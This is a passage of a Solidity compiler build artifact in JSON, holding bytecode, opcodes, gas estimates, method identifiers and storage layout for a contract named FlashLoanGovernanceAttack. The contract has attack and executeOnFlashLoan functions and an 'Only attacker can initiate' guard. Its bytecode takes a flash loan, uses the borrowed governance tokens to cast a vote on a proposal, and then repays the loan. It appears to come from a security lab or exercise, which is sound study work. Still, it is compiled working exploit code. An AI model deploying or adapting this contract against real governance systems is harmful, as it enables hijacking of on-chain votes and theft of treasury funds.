576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161026c90610803565b60405180910390fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fb056f68826040518263ffffffff1660e01b81526004016102cf9190610687565b5f604051808303815f87803b1580156102e6575f5ffd5b505af11580156102f8573d5f5f3e3d5ffd5b5050505050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461038e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103859061086b565b60405180910390fd5b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b35f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16846040518363ffffffff1660e01b815260040161040a929190610889565b6020604051808303815f875af1158015610426573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061044a91906108e5565b505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c9d27afe60035460016040518363ffffffff1660e01b81526004016104a992919061091f565b5f604051808303815f87803b1580156104c0575f5ffd5b505af11580156104d2573d5f5f3e3d5ffd5b5050505060025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1683856105419190610973565b6040518363ffffffff1660e01b815260040161055e929190610889565b6020604051808303815f875af115801561057a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061059e91906108e5565b505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6105e56105e06105db846105a3565b6105c2565b6105a3565b9050919050565b5f6105f6826105cb565b9050919050565b5f610607826105ec565b9050919050565b610617816105fd565b82525050565b5f6020820190506106305f83018461060e565b92915050565b5f610640826105ec565b9050919050565b61065081610636565b82525050565b5f6020820190506106695f830184610647565b92915050565b5f819050919050565b6106818161066f565b82525050565b5f60208201905061069a5f830184610678565b92915050565b5f6106aa826105a3565b9050919050565b6106ba816106a0565b82525050565b5f6020820190506106d35f8301846106b1565b92915050565b5f6106e3826105ec565b9050919050565b6106f3816106d9565b82525050565b5f60208201905061070c5f8301846106ea565b92915050565b5f5ffd5b61071f8161066f565b8114610729575f5ffd5b50565b5f8135905061073a81610716565b92915050565b5f6020828403121561075557610754610712565b5b5f6107628482850161072c565b91505092915050565b5f5f6040838503121561078157610780610712565b5b5f61078e8582860161072c565b925050602061079f8582860161072c565b9150509250929050565b5f82825260208201905092915050565b7f4f6e6c792061747461636b65722063616e20696e6974696174650000000000005f82015250565b5f6107ed601a836107a9565b91506107f8826107b9565b602082019050919050565b5f6020820190508181035f83015261081a816107e1565b9050919050565b7f4f6e6c792070726f7669646572000000000000000000000000000000000000005f82015250565b5f610855600d836107a9565b915061086082610821565b602082019050919050565b5f6020820190508181035f83015261088281610849565b9050919050565b5f60408201905061089c5f8301856106b1565b6108a96020830184610678565b9392505050565b5f8115159050919050565b6108c4816108b0565b81146108ce575f5ffd5b50565b5f815190506108df816108bb565b92915050565b5f602082840312156108fa576108f9610712565b5b5f610907848285016108d1565b91505092915050565b610919816108b0565b82525050565b5f6040820190506109325f830185610678565b61093f6020830184610910565b9392505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61097d8261066f565b91506109888361066f565b92508282019050808211156109a05761099f610946565b5b9291505056fea2646970667358221220eb75acd1d9b416ec12cd9b00101521e6bb65014efb1c55758eea67a59498f00364736f6c634300081d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xCC0 CODESIZE SUB DUP1 PUSH2 0xCC0 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x25C JUMP JUMPDEST DUP3 PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP2 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA530CBF1 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x2AC JUMP JUMPDEST PUSH1 0x2 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x3 DUP2 SWAP1 SSTORE POP CALLER PUSH1 0x4 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP POP PUSH2 0x2D7 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1F8 DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x208 DUP2 PUSH2 0x1EE JUMP JUMPDEST DUP2 EQ PUSH2 0x212 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x223 DUP2 PUSH2 0x1FF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x23B DUP2 PUSH2 0x229 JUMP JUMPDEST DUP2 EQ PUSH2 0x245 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x256 DUP2 PUSH2 0x232 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH0 PUSH1 0x60 DUP5 DUP7 SUB SLT ISZERO PUSH2 0x273 JUMPI PUSH2 0x272 PUSH2 0x1CB JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x280 DUP7 DUP3 DUP8 ADD PUSH2 0x215 JUMP JUMPDEST SWAP4 POP POP PUSH1 0x20 PUSH2 0x291 DUP7 DUP3 DUP8 ADD PUSH2 0x215 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x40 PUSH2 0x2A2 DUP7 DUP3 DUP8 ADD PUSH2 0x248 JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 POP SWAP3 JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2C1 JUMPI PUSH2 0x2C0 PUSH2 0x1CB JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2CE DUP5 DUP3 DUP6 ADD PUSH2 0x215 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x9DC DUP1 PUSH2 0x2E4 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x7B JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x48EB76EE GT PUSH2 0x59 JUMPI DUP1 PUSH4 0x48EB76EE EQ PUSH2 0xD9 JUMPI DUP1 PUSH4 0x5AA6E675 EQ PUSH2 0xF7 JUMPI DUP1 PUSH4 0x64DD891A EQ PUSH2 0x115 JUMPI DUP1 PUSH4 0x84F0E272 EQ PUSH2 0x131 JUMPI PUSH2 0x7B JUMP JUMPDEST DUP1 PUSH4 0x5268CFF EQ PUSH2 0x7F JUMPI DUP1 PUSH4 0x85D4883 EQ PUSH2 0x9D JUMPI DUP1 PUSH4 0x2DFCA445 EQ PUSH2 0xBB JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x87 PUSH2 0x14D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x94 SWAP2 SWAP1 PUSH2 0x61D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA5 PUSH2 0x172 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB2 SWAP2 SWAP1 PUSH2 0x656 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC3 PUSH2 0x197 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD0 SWAP2 SWAP1 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE1 PUSH2 0x19D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xEE SWAP2 SWAP1 PUSH2 0x6C0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xFF PUSH2 0x1C2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x10C SWAP2 SWAP1 PUSH2 0x6F9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x12F PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x12A SWAP2 SWAP1 PUSH2 0x740 JUMP JUMPDEST PUSH2 0x1E6 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x14B PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x146 SWAP2 SWAP1 PUSH2 0x76B JUMP JUMPDEST PUSH2 0x2FF JUMP JUMPDEST STOP JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x4 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x4 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x275 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x26C SWAP1 PUSH2 0x803 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFB056F68 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2CF SWAP2 SWAP1 PUSH2 0x687 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2E6 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x2F8 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x38E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x385 SWAP1 PUSH2 0x86B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x95EA7B3 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP5 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x40A SWAP3 SWAP2 SWAP1 PUSH2 0x889 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x426 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x44A SWAP2 SWAP1 PUSH2 0x8E5 JUMP JUMPDEST POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xC9D27AFE PUSH1 0x3 SLOAD PUSH1 0x1 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x4A9 SWAP3 SWAP2 SWAP1 PUSH2 0x91F JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x4C0 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4D2 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 DUP6 PUSH2 0x541 SWAP2 SWAP1 PUSH2 0x973 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x55E SWAP3 SWAP2 SWAP1 PUSH2 0x889 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x57A JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x59E SWAP2 SWAP1 PUSH2 0x8E5 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5E5 PUSH2 0x5E0 PUSH2 0x5DB DUP5 PUSH2 0x5A3 JUMP JUMPDEST PUSH2 0x5C2 JUMP JUMPDEST PUSH2 0x5A3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5F6 DUP3 PUSH2 0x5CB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x607 DUP3 PUSH2 0x5EC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x617 DUP2 PUSH2 0x5FD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x630 PUSH0 DUP4 ADD DUP5 PUSH2 0x60E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x640 DUP3 PUSH2 0x5EC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x650 DUP2 PUSH2 0x636 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x669 PUSH0 DUP4 ADD DUP5 PUSH2 0x647 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x681 DUP2 PUSH2 0x66F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x69A PUSH0 DUP4 ADD DUP5 PUSH2 0x678 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x6AA DUP3 PUSH2 0x5A3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6BA DUP2 PUSH2 0x6A0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6D3 PUSH0 DUP4 ADD DUP5 PUSH2 0x6B1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x6E3 DUP3 PUSH2 0x5EC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6F3 DUP2 PUSH2 0x6D9 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x70C PUSH0 DUP4 ADD DUP5 PUSH2 0x6EA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x71F DUP2 PUSH2 0x66F JUMP JUMPDEST DUP2 EQ PUSH2 0x729 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x73A DUP2 PUSH2 0x716 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x755 JUMPI PUSH2 0x754 PUSH2 0x712 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x762 DUP5 DUP3 DUP6 ADD PUSH2 0x72C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x781 JUMPI PUSH2 0x780 PUSH2 0x712 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x78E DUP6 DUP3 DUP7 ADD PUSH2 0x72C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x79F DUP6 DUP3 DUP7 ADD PUSH2 0x72C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4F6E6C792061747461636B65722063616E20696E697469617465000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x7ED PUSH1 0x1A DUP4 PUSH2 0x7A9 JUMP JUMPDEST SWAP2 POP PUSH2 0x7F8 DUP3 PUSH2 0x7B9 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x81A DUP2 PUSH2 0x7E1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4F6E6C792070726F766964657200000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x855 PUSH1 0xD DUP4 PUSH2 0x7A9 JUMP JUMPDEST SWAP2 POP PUSH2 0x860 DUP3 PUSH2 0x821 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x882 DUP2 PUSH2 0x849 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x89C PUSH0 DUP4 ADD DUP6 PUSH2 0x6B1 JUMP JUMPDEST PUSH2 0x8A9 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x678 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8C4 DUP2 PUSH2 0x8B0 JUMP JUMPDEST DUP2 EQ PUSH2 0x8CE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x8DF DUP2 PUSH2 0x8BB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x8FA JUMPI PUSH2 0x8F9 PUSH2 0x712 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x907 DUP5 DUP3 DUP6 ADD PUSH2 0x8D1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x919 DUP2 PUSH2 0x8B0 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x932 PUSH0 DUP4 ADD DUP6 PUSH2 0x678 JUMP JUMPDEST PUSH2 0x93F PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x910 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x97D DUP3 PUSH2 0x66F JUMP JUMPDEST SWAP2 POP PUSH2 0x988 DUP4 PUSH2 0x66F JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0x9A0 JUMPI PUSH2 0x99F PUSH2 0x946 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEB PUSH22 0xACD1D9B416EC12CD9B00101521E6BB65014EFB1C5575 DUP15 0xEA PUSH8 0xA59498F00364736F PUSH13 0x634300081D0033000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "504800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack(uint256)": "infinite",
						"attacker()": "2508",
						"executeOnFlashLoan(uint256,uint256)": "infinite",
						"govToken()": "infinite",
						"governance()": "infinite",
						"proposalId()": "2470",
						"provider()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack(uint256)": "64dd891a",
					"attacker()": "48eb76ee",
					"executeOnFlashLoan(uint256,uint256)": "84f0e272",
					"govToken()": "05268cff",
					"governance()": "5aa6e675",
					"proposalId()": "2dfca445",
					"provider()": "085d4883"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 43,
						"contract": "I/FlashLoanGovernanceAttack.sol:FlashLoanGovernanceAttack",
						"label": "governance",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(IGovernance)39"
					},
					{
						"astId": 46,
						"contract": "I/FlashLoanGovernanceAttack.sol:FlashLoanGovernanceAttack",
						"label": "provider",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(IFlashLoanProvider)7"
					},
					{
						"astId": 49,
						"contract": "I/FlashLoanGovernanceAttack.sol:FlashLoanGovernanceAttack",
						"label": "govToken",
						"offset": 0,
						"slot": "2",
						"type": "t_contract(IERC20)26"
					},
					{
						"astId": 51,
						"contract": "I/FlashLoanGovernanceAttack.sol:FlashLoanGovernanceAttack",
						"label": "proposalId",
						"offset": 0,
						"slot": "3",
						"type": "t_uint256"
					},
					{
						"astId": 53,
						"contract": "I/FlashLoanGovernanceAttack.sol:FlashLoanGovernanceAttack",
						"label": "attacker",
						"offset": 0,
						"slot": "4",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
